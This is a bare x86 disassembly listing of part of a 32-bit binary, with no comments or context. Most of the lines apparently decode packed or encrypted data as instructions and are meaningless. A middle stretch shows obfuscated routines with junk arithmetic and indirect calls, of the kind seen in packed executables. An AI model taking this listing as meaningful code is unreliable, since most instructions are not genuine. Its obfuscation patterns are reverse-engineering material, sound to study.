  40f3ad:	imul   edx,DWORD PTR [ecx-0x59],0xffffffbf
  40f3b1:	mov    ds:0x35fe9e36,al
  40f3b6:	inc    eax
  40f3b7:	rcl    BYTE PTR [edi+ebp*8],0xaf
  40f3bb:	sahf   
  40f3bc:	mov    ebx,0x24d1635d
  40f3c1:	mov    ds:0xc6d1da9d,al
  40f3c6:	jo     0x40f408
  40f3c8:	cmp    eax,0xaa731599
  40f3cd:	add    eax,0xb8400996
  40f3d2:	push   eax
  40f3d3:	sbb    ch,BYTE PTR [edi]
  40f3d5:	mul    edi
  40f3d7:	xchg   esp,eax
  40f3d8:	fisubr WORD PTR [edi+0xd]
  40f3db:	mov    eax,esi
  40f3dd:	xchg   DWORD PTR [edx+edi*8+0x21],ebp
  40f3e1:	in     eax,0x4a
  40f3e3:	ins    BYTE PTR es:[edi],dx
  40f3e4:	fdiv   DWORD PTR [eax+ebx*1+0x4e]
  40f3e8:	pop    ds
  40f3e9:	stc    
  40f3ea:	jo     0x40f374
  40f3ec:	xchg   DWORD PTR [esi],edx
  40f3ee:	aas    
  40f3ef:	sub    edi,DWORD PTR [ebp+0x1df67832]
  40f3f5:	int3   
  40f3f6:	xchg   ebp,eax
  40f3f7:	dec    edx
  40f3f8:	sbb    bh,BYTE PTR [ebx-0x3f81dd9f]
  40f3fe:	retf   0xaf6a
  40f401:	dec    ecx
  40f402:	push   esi
  40f403:	lock push edi
  40f405:	add    eax,0x2f5cf557
  40f40a:	gs jmp 0xcce2:0xb0eada03
  40f412:	xchg   ecx,eax
  40f413:	ins    BYTE PTR es:[edi],dx
  40f414:	push   esp
  40f415:	add    DWORD PTR [ebp-0xb],0x3d
  40f419:	sbb    DWORD PTR [esi],0xffffff9e
  40f41c:	inc    esi
  40f41d:	xchg   esp,eax
  40f41e:	mov    ebp,0x81dd755c
  40f423:	(bad)  
  40f425:	pop    es
  40f426:	fmulp  st(1),st
  40f428:	loopne 0x40f3e6
  40f42a:	push   ecx
  40f42b:	(bad)
  40f42f:	push   ebp
  40f430:	sub    eax,0xfb5c53e4
  40f435:	lds    ecx,FWORD PTR [esi-0x3936799f]
  40f43b:	cli    
  40f43c:	cld    
  40f43d:	arpl   WORD PTR [eax-0x4a885e29],sp
  40f443:	icebp  
  40f444:	push   ds
  40f445:	in     eax,0x17
  40f447:	stos   DWORD PTR es:[edi],eax
  40f448:	add    BYTE PTR [ebx],dl
  40f44a:	or     al,0xc1
  40f44c:	bound  edi,QWORD PTR [ebx-0x34]
  40f44f:	sbb    BYTE PTR [edi],ch
  40f451:	push   esp
  40f452:	xchg   esi,eax
  40f453:	sbb    eax,0x62e150e8
  40f458:	mov    ecx,0xcee2be02
  40f45d:	mov    es,WORD PTR ds:0x7128099b
  40f463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f464:	adc    dl,BYTE PTR [ecx+0x2]
  40f467:	cmp    esp,DWORD PTR [eax+0xce0ade9]
  40f46d:	pushf  
  40f46e:	push   eax
  40f46f:	push   0x71
  40f471:	pop    ds
  40f472:	dec    edx
  40f473:	xor    ecx,edx
  40f475:	sbb    dh,BYTE PTR [ebp*1-0xd9aafc9]
  40f47c:	aam    0x2e
  40f47e:	jge    0x40f4ae
  40f480:	add    al,0x34
  40f482:	pushf  
  40f483:	mov    edi,0x742745e6
  40f488:	fnstcw WORD PTR [edi-0x28]
  40f48b:	data16 adc ch,cl
  40f48e:	scas   eax,DWORD PTR es:[edi]
  40f48f:	std    
  40f490:	push   edx
  40f491:	and    al,0x24
  40f493:	jg     0x40f4a4
  40f495:	je     0x40f4f9
  40f497:	sub    DWORD PTR [ebx+0x4b],ecx
  40f49a:	hlt    
  40f49b:	call   0xfe3f:0xc5584f8f
  40f4a2:	scas   al,BYTE PTR es:[edi]
  40f4a3:	js     0x40f42d
  40f4a5:	int3   
  40f4a6:	cs xchg edi,eax
  40f4a8:	fisub  WORD PTR ds:0x3c5ad805
  40f4ae:	sar    DWORD PTR [eax+eiz*1],1
  40f4b1:	xor    eax,0x526e0564
  40f4b6:	sub    al,0x28
  40f4b8:	loopne 0x40f444
  40f4ba:	das    
  40f4bb:	scas   al,BYTE PTR es:[edi]
  40f4bc:	adc    eax,0x1c0c803f
  40f4c1:	scas   al,BYTE PTR es:[edi]
  40f4c2:	pop    ss
  40f4c3:	push   cs
  40f4c4:	and    eax,0x168a1ff0
  40f4c9:	cmp    dl,BYTE PTR [edx+0x23dc4014]
  40f4cf:	inc    esi
  40f4d0:	std    
  40f4d1:	fmul   DWORD PTR [ebp-0x1608ff52]
  40f4d7:	push   edx
  40f4d8:	mov    ds:0xd8090ccc,al
  40f4dd:	mov    ecx,0x214ce568
  40f4e2:	pop    es
  40f4e3:	push   edx
  40f4e4:	push   edx
  40f4e5:	push   0x6156ca
  40f4ea:	in     eax,dx
  40f4eb:	xchg   esp,eax
  40f4ec:	or     eax,0x42ad09c2
  40f4f1:	mov    ecx,DWORD PTR [ebp+edi*1+0x17f230b1]
  40f4f8:	jo     0x40f569
  40f4fa:	cmp    DWORD PTR [eax],0x9a57af39
  40f500:	jb     0x40f526
  40f502:	cs or  al,0x63
  40f505:	mov    cl,0x67
  40f507:	lods   eax,DWORD PTR ds:[esi]
  40f508:	dec    ebx
  40f509:	lods   eax,DWORD PTR ds:[esi]
  40f50a:	call   0x1e6c6bc
  40f50f:	fdivr  QWORD PTR [ecx+0xf]
  40f512:	fbld   TBYTE PTR [ebx-0x65306bde]
  40f518:	pop    edx
  40f519:	iret   
  40f51a:	jecxz  0x40f52b
  40f51c:	mov    al,0xbe
  40f51e:	in     eax,dx
  40f51f:	inc    esi
  40f520:	dec    edi
  40f521:	mov    BYTE PTR [bp+di+0x68ab],al
  40f526:	(bad)  
  40f527:	sbb    dl,al
  40f529:	and    DWORD PTR [esi-0x264a783a],0xa679cf26
  40f533:	add    ebx,DWORD PTR [edi+0x53]
  40f536:	mov    WORD PTR [esi+esi*8-0xa89bdf3],cs
  40f53d:	repnz popa 
  40f53f:	jae    0x40f54b
  40f541:	jmp    0x70c05333
  40f546:	add    ebx,edx
  40f548:	cwde   
  40f549:	sbb    di,dx
  40f54c:	xor    edx,DWORD PTR [ecx-0x3f]
  40f54f:	call   0x528b:0x597584c5
  40f556:	inc    ecx
  40f557:	jb     0x40f595
  40f559:	inc    DWORD PTR [eax-0x71]
  40f55c:	call   0xff9979fe
  40f561:	jp     0x40f578
  40f563:	dec    eax
  40f564:	mov    dl,0x62
  40f566:	ja     0x40f581
  40f568:	jbe    0x40f54b
  40f56a:	cmp    BYTE PTR [edx],ah
  40f56c:	call   0x21b2:0x48739450
  40f573:	inc    ebp
  40f574:	fsubr  st(7),st
  40f576:	mov    ds:0x768a1ecd,eax
  40f57b:	push   ebp
  40f57c:	pop    esi
  40f57d:	dec    ecx
  40f57e:	cli    
  40f57f:	(bad)  
  40f580:	inc    ebx
  40f581:	sbb    DWORD PTR [edi-0xa2d2179],esp
  40f587:	ror    DWORD PTR [ecx-0x79],cl
  40f58a:	ret    
  40f58b:	dec    ecx
  40f58c:	mov    ecx,0xb26aa8c
  40f591:	xchg   esp,eax
  40f592:	sub    DWORD PTR [ecx+ebp*8+0x2],eax
  40f596:	dec    edx
  40f597:	mov    dl,0x30
  40f599:	mov    cl,0xf6
  40f59b:	ret    0xdbe3
  40f59e:	les    esi,FWORD PTR [ecx]
  40f5a0:	push   ebp
  40f5a1:	adc    ebp,DWORD PTR [ecx+0x7df1b65d]
  40f5a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5a8:	jmp    0x5a5f:0x100cb3d6
  40f5af:	cld    
  40f5b0:	push   ebp
  40f5b1:	and    eax,0x1b4550e6
  40f5b6:	lea    ecx,[ecx+0x16ac12d0]
  40f5bc:	sbb    BYTE PTR [eax],ah
  40f5be:	idiv   edx
  40f5c0:	std    
  40f5c1:	jl     0x40f5df
  40f5c3:	call   0x3009:0xfc76dfc9
  40f5ca:	xchg   ebx,eax
  40f5cb:	mov    ah,0x37
  40f5cd:	imul   esp,DWORD PTR [edi-0x3e423bd4],0x3b273347
  40f5d7:	xor    eax,0xc3dfe518
  40f5dc:	shr    BYTE PTR [eax+0x4e7dbe8b],1
  40f5e2:	imul   ebp,DWORD PTR ds:0x20500b39,0x19
  40f5e9:	xor    DWORD PTR gs:[edx],edi
  40f5ec:	xchg   esp,eax
  40f5ed:	xor    DWORD PTR [esi],0xfffffff7
  40f5f0:	dec    ebp
  40f5f1:	fdiv   st,st(0)
  40f5f3:	push   ecx
  40f5f4:	mov    al,ds:0xfcb9c227
  40f5f9:	cmp    bh,BYTE PTR [edi-0x416d1e42]
  40f5ff:	sub    eax,0xffdc00e6
  40f604:	sti    
  40f605:	sbb    esp,DWORD PTR [ecx]
  40f607:	pop    es
  40f608:	dec    esi
  40f609:	jb     0x40f5be
  40f60b:	push   es
  40f60c:	(bad)  
  40f60e:	mov    BYTE PTR [edi+0x1ed5f3c8],ah
  40f614:	lds    edi,FWORD PTR [edx]
  40f616:	sbb    ebx,ebp
  40f618:	xchg   ebx,eax
  40f619:	rcr    DWORD PTR [eax],cl
  40f61b:	jae    0x40f5e3
  40f61d:	jae    0x40f626
  40f61f:	and    DWORD PTR [eax+0x596aff49],edx
  40f625:	adc    esi,DWORD PTR [ebx]
  40f627:	sub    ebx,edx
  40f629:	jns    0x40f5de
  40f62b:	sub    eax,0x74e12465
  40f630:	mov    bh,0x38
  40f632:	adc    esi,edi
  40f634:	dec    ebp
  40f635:	rol    DWORD PTR [edi+0x30837a3d],1
  40f63b:	lea    esp,[ebx]
  40f63d:	xor    BYTE PTR [edi+0x68],al
  40f640:	mov    al,0x4a
  40f642:	clc    
  40f643:	inc    ebp
  40f644:	inc    ebp
  40f645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f646:	stc    
  40f647:	repz mov ds,WORD PTR fs:[esi+edi*4-0x59]
  40f64d:	add    DWORD PTR [eax-0x4ad3acd7],edx
  40f653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f654:	adc    ch,BYTE PTR [esi+0x532fbca0]
  40f65a:	stc    
  40f65b:	sbb    al,BYTE PTR [ebx-0x26]
  40f65e:	mov    BYTE PTR [ebx],dl
  40f660:	shl    DWORD PTR [ebp-0x4b],0x9d
  40f664:	stos   BYTE PTR es:[edi],al
  40f665:	jl     0x40f5f5
  40f667:	mov    al,0x42
  40f669:	xor    eax,0xd1563761
  40f66e:	in     eax,0x69
  40f670:	mov    eax,ds:0xd5523bbb
  40f675:	xor    eax,0x6961f93c
  40f67a:	xchg   DWORD PTR [ecx+ebp*4],ebp
  40f67d:	call   0xf3faf013
  40f682:	push   ss
  40f683:	push   es
  40f684:	cwde   
  40f685:	jb     0x40f659
  40f687:	jno    0x40f696
  40f689:	gs fcmovnbe st,st(7)
  40f68c:	cmp    eax,0xf81394fe
  40f691:	jb     0x40f709
  40f693:	iret   
  40f694:	push   ss
  40f695:	sub    esi,DWORD PTR [eax+0x49]
  40f698:	pop    eax
  40f699:	push   eax
  40f69a:	sub    BYTE PTR [eax-0x6313dd3d],bh
  40f6a0:	pop    edi
  40f6a1:	sub    DWORD PTR [eax+0x3e],edi
  40f6a4:	jmp    0x40f6c2
  40f6a6:	popf   
  40f6a7:	push   0xbffadc9c
  40f6ac:	test   DWORD PTR [eax+0x43aaeafd],0x17aa3db
  40f6b6:	js     0x40f6e4
  40f6b8:	dec    edi
  40f6b9:	or     esi,ecx
  40f6bb:	cwde   
  40f6bc:	dec    ecx
  40f6bd:	pop    edi
  40f6be:	sbb    DWORD PTR [ebp+0x4ea9ab16],esp
  40f6c4:	dec    DWORD PTR [esi+ebp*8+0x16]
  40f6c8:	jp     0x40f6fc
  40f6ca:	(bad)  
  40f6cb:	or     ebx,esp
  40f6cd:	mov    bh,0x2b
  40f6cf:	jb     0x40f6d4
  40f6d1:	fisttp WORD PTR [edi-0x33c0658d]
  40f6d7:	push   edi
  40f6d8:	je     0x40f691
  40f6da:	jp     0x40f746
  40f6dc:	fnstsw WORD PTR [eax-0x353d7d8b]
  40f6e2:	xor    BYTE PTR [edx-0x2d],ch
  40f6e5:	fs sbb al,0x8a
  40f6e8:	ins    BYTE PTR es:[edi],dx
  40f6e9:	inc    ebx
  40f6ea:	mov    ebx,0x532a81e4
  40f6ef:	mov    ch,0x61
  40f6f1:	dec    ebp
  40f6f2:	fistp  QWORD PTR [edx]
  40f6f4:	sbb    ebx,eax
  40f6f6:	push   esi
  40f6f7:	jle    0x40f737
  40f6f9:	retf   
  40f6fa:	dec    ebx
  40f6fb:	imul   esi,DWORD PTR [esi-0x5ef93413],0x9dbb0855
  40f705:	xor    ebx,DWORD PTR [esi]
  40f707:	es retf 
  40f709:	retf   0x3315
  40f70c:	(bad)  
  40f70d:	push   ebp
  40f70e:	rcl    DWORD PTR [eax],0x30
  40f711:	push   edx
  40f712:	cmp    BYTE PTR [edi+0x550f12a3],cl
  40f718:	xor    dh,BYTE PTR [esi]
  40f71a:	sub    eax,0xd05dc638
  40f71f:	pop    eax
  40f720:	mov    al,ds:0xec2f56e7
  40f725:	mov    ds:0xb7716c3d,al
  40f72a:	mov    DWORD PTR [edi+0x3d],edi
  40f72d:	ins    BYTE PTR es:[edi],dx
  40f72e:	jne    0x40f757
  40f730:	xor    ebx,edx
  40f732:	sbb    BYTE PTR [ebx+eax*2+0x22a01318],ah
  40f739:	lods   eax,DWORD PTR ds:[esi]
  40f73a:	(bad)  
  40f73c:	jnp    0x40f75c
  40f73e:	jge    0x40f701
  40f740:	fiadd  DWORD PTR [ecx+0x7666099d]
  40f746:	sub    DWORD PTR [ebx],eax
  40f748:	fwait
  40f749:	dec    ecx
  40f74a:	ss leave 
  40f74c:	or     eax,0x21f617a8
  40f751:	ins    WORD PTR es:[edi],dx
  40f753:	retf   0x878a
  40f756:	jo     0x40f758
  40f758:	jbe    0x40f75b
  40f75a:	cwde   
  40f75b:	aam    0x5e
  40f75d:	mov    dh,0x34
  40f75f:	mov    ecx,0x9bceaf53
  40f764:	cwde   
  40f765:	inc    ebx
  40f766:	or     BYTE PTR [eax*8+0x31c01a44],cl
  40f76d:	call   0x659c:0xffbb8c91
  40f774:	out    0x18,al
  40f776:	jp     0x40f764
  40f778:	(bad)  
  40f77a:	xor    cl,BYTE PTR [ebx-0x716dc809]
  40f780:	mov    dl,0xee
  40f782:	dec    esi
  40f783:	icebp  
  40f784:	push   es
  40f785:	retf   0x2d6e
  40f788:	std    
  40f789:	or     BYTE PTR [ecx-0x3841fdcd],bl
  40f78f:	retf   
  40f790:	jae    0x40f7c9
  40f792:	sar    ah,1
  40f794:	cmp    esp,ebx
  40f796:	ins    DWORD PTR es:[edi],dx
  40f797:	mov    ebp,0x89f7316e
  40f79c:	jp     0x40f7ca
  40f79e:	cmp    ch,0x50
  40f7a1:	loopne 0x40f7b8
  40f7a3:	fisubr WORD PTR [ecx]
  40f7a5:	sbb    eax,0x955c0697
  40f7aa:	pop    edi
  40f7ab:	das    
  40f7ac:	add    BYTE PTR [edi],cl
  40f7ae:	addr16 ret 
  40f7b0:	xor    cl,BYTE PTR [edi]
  40f7b2:	icebp  
  40f7b3:	jne    0x40f7ae
  40f7b5:	sub    dl,BYTE PTR ds:[edx-0x27]
  40f7b9:	add    DWORD PTR [edi-0x2842a5e2],eax
  40f7bf:	iret   
  40f7c0:	xor    esi,DWORD PTR [esi-0x26698ef8]
  40f7c6:	dec    ebx
  40f7c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7c8:	dec    eax
  40f7c9:	rcr    ecx,0x4b
  40f7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7cd:	(bad)  
  40f7cf:	shr    DWORD PTR [ebx-0x6eba22d8],0x48
  40f7d6:	bound  ecx,QWORD PTR [ecx-0x2683b8b]
  40f7dc:	xor    al,0xd1
  40f7de:	pop    esi
  40f7df:	out    dx,eax
  40f7e0:	je     0x40f81d
  40f7e2:	mov    ebp,0xe3e11300
  40f7e7:	pop    ss
  40f7e8:	fistp  QWORD PTR [esi]
  40f7ea:	js     0x40f806
  40f7ec:	dec    edx
  40f7ed:	shl    BYTE PTR [eax-0x4e],1
  40f7f0:	enter  0xd0f2,0x6b
  40f7f4:	mov    edi,0x69bfa00c
  40f7f9:	test   BYTE PTR [ecx-0x52],ah
  40f7fc:	into   
  40f7fd:	push   ds
  40f7fe:	jno    0x40f795
  40f800:	mov    bl,0xe5
  40f802:	xor    ebx,DWORD PTR [ebx]
  40f804:	mov    ah,ch
  40f806:	or     eax,0x726da437
  40f80b:	stc    
  40f80c:	sahf   
  40f80d:	push   cs
  40f80e:	lock mov ebx,db7
  40f812:	(bad)  
  40f813:	fst    DWORD PTR [ebx+0x3e]
  40f816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f817:	int    0xb2
  40f819:	ret    
  40f81a:	xor    DWORD PTR [edi+0x1a],esi
  40f81d:	sub    bl,BYTE PTR [edi]
  40f81f:	xchg   esi,eax
  40f820:	scas   al,BYTE PTR es:[edi]
  40f821:	add    BYTE PTR [ecx],dh
  40f823:	ja     0x40f89c
  40f825:	xchg   ecx,eax
  40f826:	call   0x59ca:0x3261cbd
  40f82d:	mov    eax,0x54a82004
  40f832:	das    
  40f833:	popa   
  40f834:	and    cl,BYTE PTR [ebp+0x4124d20f]
  40f83a:	stos   DWORD PTR es:[edi],eax
  40f83b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f83c:	mov    ecx,0x8be17928
  40f841:	mov    dl,bl
  40f843:	cmp    DWORD PTR [ecx+0x6ff14a6a],0xffffffb4
  40f84a:	push   ebx
  40f84b:	mov    bl,BYTE PTR [ecx-0x15eb4520]
  40f851:	and    al,0x9f
  40f853:	int3   
  40f854:	xchg   ecx,eax
  40f855:	dec    eax
  40f856:	xchg   ecx,eax
  40f857:	dec    ecx
  40f858:	xchg   ecx,edx
  40f85a:	dec    edx
  40f85b:	push   edx
  40f85c:	mov    edx,ebx
  40f85e:	pop    ebx
  40f85f:	dec    ebx
  40f860:	call   DWORD PTR [ebx]
  40f862:	cmp    DWORD PTR [ebp+0x10],esi
  40f865:	je     0x40f884
  40f86b:	xchg   edx,eax
  40f86c:	push   0xb
  40f86e:	pop    ecx
  40f86f:	push   0x4
  40f871:	pop    ebx
  40f872:	inc    ebx
  40f873:	xchg   ebx,ecx
  40f875:	sub    ebx,ecx
  40f877:	xchg   ebx,ecx
  40f879:	dec    ecx
  40f87a:	dec    ecx
  40f87b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f87e:	imul   eax,ecx
  40f881:	add    esp,eax
  40f883:	xchg   edx,eax
  40f884:	push   eax
  40f885:	xor    ebx,ebx
  40f887:	mov    edx,esp
  40f889:	dec    edx
  40f88a:	inc    ebx
  40f88b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f88e:	dec    ebx
  40f88f:	xor    edx,edx
  40f891:	add    DWORD PTR [ebp-0xc],ebx
  40f894:	pop    ebx
  40f895:	mov    eax,DWORD PTR [ebp-0xc]
  40f898:	pop    edi
  40f899:	pop    esi
  40f89a:	pop    ebx
  40f89b:	leave  
  40f89c:	ret    0x10
  40f89f:	push   ebp
  40f8a0:	mov    ebp,esp
  40f8a2:	push   ecx
  40f8a3:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40f8aa:	add    DWORD PTR ds:0x42c010,0x33e6
  40f8b4:	mov    eax,DWORD PTR [ebp-0x4]
  40f8b7:	or     edx,ecx
  40f8b9:	mov    edx,DWORD PTR [ebp+0x10]
  40f8bc:	mov    ecx,0x7510893
  40f8c1:	xor    eax,ecx
  40f8c3:	and    DWORD PTR ds:0x42d008,0x1b89
  40f8cd:	add    eax,0x3272db
  40f8d2:	or     DWORD PTR ds:0x42a01c,0x429008
  40f8dc:	mov    DWORD PTR [edx],eax
  40f8de:	and    DWORD PTR ds:0x42c01c,0x0
  40f8e8:	xor    eax,eax
  40f8ea:	add    eax,DWORD PTR ds:0x42c01c
  40f8f0:	inc    eax
  40f8f1:	mov    ds:0x42c01c,eax
  40f8f6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f8fd:	jne    0x40f90f
  40f903:	push   DWORD PTR [ebp-0x20]
  40f906:	push   DWORD PTR [ebp-0x20]
  40f909:	call   DWORD PTR ds:0x425034
  40f90f:	cmp    DWORD PTR ds:0x42c01c,0x1d
  40f916:	jb     0x40f8e8
  40f91c:	and    DWORD PTR ds:0x42d01c,0x0
  40f926:	jmp    0x40f938
  40f92b:	mov    edx,DWORD PTR ds:0x42d01c
  40f931:	inc    edx
  40f932:	mov    DWORD PTR ds:0x42d01c,edx
  40f938:	cmp    DWORD PTR ds:0x42d01c,0x1b
  40f93f:	jae    0x40f96c
  40f945:	cmp    DWORD PTR ds:0x42d01c,0x1d
  40f94c:	jne    0x40f967
  40f952:	push   0x4244f4
  40f957:	push   0x4244a4
  40f95c:	push   0x42c7
  40f961:	call   DWORD PTR ds:0x42503c
  40f967:	jmp    0x40f92b
  40f96c:	mov    eax,DWORD PTR [ebp+0xc]
  40f96f:	xor    eax,ecx
  40f971:	push   esi
  40f972:	mov    esi,DWORD PTR [ebp+0x10]
  40f975:	mov    edx,0x3272db
  40f97a:	add    eax,edx
  40f97c:	mov    DWORD PTR [esi+0x4],eax
  40f97f:	mov    eax,DWORD PTR [ebp+0x14]
  40f982:	mov    esi,DWORD PTR [ebp+0x10]
  40f985:	mov    DWORD PTR [esi+0x8],eax
  40f988:	mov    eax,DWORD PTR [ebp+0x18]
  40f98b:	mov    esi,DWORD PTR [ebp+0x10]
  40f98e:	mov    DWORD PTR [esi+0xc],eax
  40f991:	mov    eax,DWORD PTR [ebp+0x1c]
  40f994:	mov    esi,DWORD PTR [ebp+0x10]
  40f997:	mov    DWORD PTR [esi+0x10],eax
  40f99a:	mov    eax,DWORD PTR [ebp+0x8]
  40f99d:	xor    eax,ecx
  40f99f:	add    eax,edx
  40f9a1:	pop    esi
  40f9a2:	leave  
  40f9a3:	ret    0x18
  40f9a6:	push   ebp
  40f9a7:	mov    ebp,esp
  40f9a9:	mov    eax,ds:0x423f9a
  40f9ae:	mov    eax,DWORD PTR [eax+0x1c8]
  40f9b4:	mov    eax,DWORD PTR [eax]
  40f9b6:	movzx  ecx,BYTE PTR ds:0x429000
  40f9bd:	and    DWORD PTR ds:0x42d010,ecx
  40f9c3:	cdq    
  40f9c4:	push   ebx
  40f9c5:	add    DWORD PTR ds:0x42a008,0x429020
  40f9cf:	mov    ecx,0xfabdbef1
  40f9d4:	add    eax,ecx
  40f9d6:	mov    DWORD PTR ds:0x42d008,0x7e66
  40f9e0:	adc    edx,0xffffffff
  40f9e3:	or     DWORD PTR ds:0x42a014,edi
  40f9e9:	push   esi
  40f9ea:	push   edi
  40f9eb:	and    DWORD PTR ds:0x42a00c,0x0
  40f9f5:	jmp    0x40fa09
  40f9fa:	xor    ebx,ebx
  40f9fc:	or     ebx,DWORD PTR ds:0x42a00c
  40fa02:	inc    ebx
  40fa03:	mov    DWORD PTR ds:0x42a00c,ebx
  40fa09:	cmp    DWORD PTR ds:0x42a00c,0x1b
  40fa10:	jae    0x40fa41
  40fa16:	cmp    DWORD PTR ds:0x42a00c,0x26
  40fa1d:	jne    0x40fa36
  40fa23:	push   0x7619
  40fa28:	push   0x3c20
  40fa2d:	push   DWORD PTR [ebp-0x18]
  40fa30:	call   DWORD PTR ds:0x425040
  40fa36:	jmp    0x40f9fa
  40fa3b:	adc    ebx,DWORD PTR ds:0x42d018
  40fa41:	mov    edi,edx
  40fa43:	mov    edx,DWORD PTR [ebp+0x8]
  40fa46:	mov    DWORD PTR ds:0x42c000,0x5718
  40fa50:	mov    ebx,eax
  40fa52:	and    DWORD PTR ds:0x42c004,0x67ab
  40fa5c:	mov    eax,0x8a29a123
  40fa61:	xor    esi,esi
  40fa63:	or     DWORD PTR ds:0x429024,0x42d014
  40fa6d:	xor    ebx,eax
  40fa6f:	or     DWORD PTR ds:0x42d000,0x42a014
  40fa79:	xor    edi,0x0
  40fa7c:	and    DWORD PTR ds:0x42d000,0x42a00c
  40fa86:	add    edx,ecx
  40fa88:	adc    esi,0xffffffff
  40fa8b:	xor    edx,eax
  40fa8d:	or     DWORD PTR ds:0x42c010,0x42b010
  40fa97:	jmp    0x411e4e
  40fa9c:	mov    WORD PTR [ebx+0x6643964b],?
  40faa2:	arpl   WORD PTR [ebx+0x42],sp
  40faa5:	jno    0x40fa92
  40faa7:	sar    BYTE PTR [edi-0x67],cl
  40faaa:	mov    ebx,0x628e78b0
  40faaf:	(bad)  
  40fab0:	enter  0x625f,0x62
  40fab4:	jle    0x40fa8e
  40fab6:	sti    
  40fab7:	sbb    eax,0xf9915f6f
  40fabc:	push   cs
  40fabd:	aad    0xc0
  40fabf:	jecxz  0x40fa47
  40fac1:	mov    cl,0x8c
  40fac3:	push   edx
  40fac4:	push   0xffffffae
  40fac6:	iret   
  40fac7:	fsubr  st,st(1)
  40fac9:	xor    esp,0x881683a
  40facf:	xor    bh,0xaa
  40fad2:	stc    
  40fad3:	mov    cl,BYTE PTR [ecx-0x32]
  40fad6:	into   
  40fad7:	aas    
  40fad8:	and    al,0x83
  40fada:	retf   0xabbc
  40fadd:	pop    ds
  40fade:	iret   
  40fadf:	xor    DWORD PTR [ecx-0x350d9a5c],edi
  40fae5:	cmp    BYTE PTR [edx],bl
  40fae7:	scas   eax,DWORD PTR es:[edi]
  40fae8:	xor    eax,0x1849f35c
  40faed:	pop    edx
  40faee:	cmp    al,0x9f
  40faf0:	xchg   edi,eax
  40faf1:	mov    DWORD PTR ds:0x63c6f9c3,ebx
  40faf7:	data16 xor al,0x80
  40fafa:	and    eax,edi
  40fafc:	push   cs
  40fafd:	iret   
  40fafe:	dec    ebx
  40faff:	out    dx,eax
  40fb00:	adc    eax,0x92facc05
  40fb05:	push   eax
  40fb06:	ja     0x40fae6
  40fb08:	adc    ebp,ebp
  40fb0a:	mov    ah,0x8f
  40fb0c:	in     al,dx
  40fb0d:	ret    0xebac
  40fb10:	add    bl,bh
  40fb12:	retf   
  40fb13:	sbb    BYTE PTR [eax+0x5105d425],cl
  40fb19:	daa    
  40fb1a:	ror    esp,1
  40fb1c:	push   ebp
  40fb1d:	addr16 (bad) 
  40fb1f:	sbb    BYTE PTR [esi],dh
  40fb21:	data16 into 
  40fb23:	ins    BYTE PTR es:[edi],dx
  40fb24:	add    BYTE PTR [edi-0x3b2d3bbb],bl
  40fb2a:	jno    0x40fb59
  40fb2c:	(bad)  
  40fb2d:	sti    
  40fb2e:	pop    edi
  40fb2f:	icebp  
  40fb30:	mov    al,0xaa
  40fb32:	and    BYTE PTR [esi-0x5d],0x10
  40fb36:	addr16 imul ebx,ebp,0x67
  40fb3a:	pop    edi
  40fb3b:	call   DWORD PTR [ebx]
  40fb3d:	neg    DWORD PTR [ecx+0x537455e]
  40fb43:	xor    DWORD PTR [esi-0x23],0xe1a1032f
  40fb4a:	dec    ecx
  40fb4b:	into   
  40fb4c:	inc    edx
  40fb4d:	jge    0x40fb68
  40fb4f:	loope  0x40fbcc
  40fb51:	dec    ebx
  40fb52:	push   esi
  40fb53:	repz adc esi,DWORD PTR [ecx-0x23491785]
  40fb5a:	cli    
  40fb5b:	cmp    BYTE PTR [edx+0x2e0584ef],dl
  40fb61:	dec    ecx
  40fb62:	mov    al,BYTE PTR [ebp+0x37]
  40fb65:	cmp    BYTE PTR [ecx-0x6fd30aed],cl
  40fb6b:	sub    dl,BYTE PTR [edx]
  40fb6d:	pop    ds
  40fb6e:	xchg   DWORD PTR [edi+0xeaa1821],ebx
  40fb74:	fimul  DWORD PTR [esi+0x5c]
  40fb77:	pop    ss
  40fb78:	mov    al,ds:0x9874ac39
  40fb7d:	pop    esi
  40fb7e:	(bad)  
  40fb7f:	int    0xfa
  40fb81:	jmp    0xb283:0xe647588b
  40fb88:	pop    edi
  40fb89:	loopne 0x40fb88
  40fb8b:	stos   DWORD PTR es:[edi],eax
  40fb8c:	pushf  
  40fb8d:	dec    eax
  40fb8e:	cmp    eax,0x98d11601
  40fb93:	adc    al,0x5b
  40fb95:	jae    0x40fbde
  40fb97:	aas    
  40fb98:	mov    edi,0x7317abc6
  40fb9d:	test   al,0x3f
  40fb9f:	sbb    edi,DWORD PTR [ebp+0xb72d42b]
  40fba5:	out    dx,al
  40fba6:	div    bl
  40fba8:	js     0x40fc0b
  40fbaa:	inc    edi
  40fbab:	mov    bh,0x7
  40fbad:	xchg   DWORD PTR [ecx+eiz*8-0x11],ecx
  40fbb1:	push   cs
  40fbb2:	and    dl,BYTE PTR ds:0xb6dcebb4
  40fbb8:	icebp  
  40fbb9:	sub    ebp,DWORD PTR [esi+0x32]
  40fbbc:	out    0x6a,al
  40fbbe:	stc    
  40fbbf:	in     eax,dx
  40fbc0:	or     DWORD PTR [esi-0x27],edi
  40fbc3:	aas    
  40fbc4:	and    eax,0xb7f9e7ae
  40fbc9:	int3   
  40fbca:	mov    ah,BYTE PTR [esp+eiz*2+0x368378f9]
  40fbd1:	dec    edi
  40fbd2:	retfw  0xc664
  40fbd6:	lods   eax,DWORD PTR ds:[esi]
  40fbd7:	jmp    0xef06fcb1
  40fbdc:	push   edx
  40fbdd:	std    
  40fbde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbdf:	out    0xc3,eax
  40fbe1:	dec    ebp
  40fbe2:	mov    bl,0x96
  40fbe4:	lock xor DWORD PTR [edx-0x4],edi
  40fbe8:	xor    DWORD PTR [esi+eiz*2+0x14],esp
  40fbec:	leave  
  40fbed:	or     DWORD PTR [ecx],eax
  40fbef:	std    
  40fbf0:	cs mov bh,bh
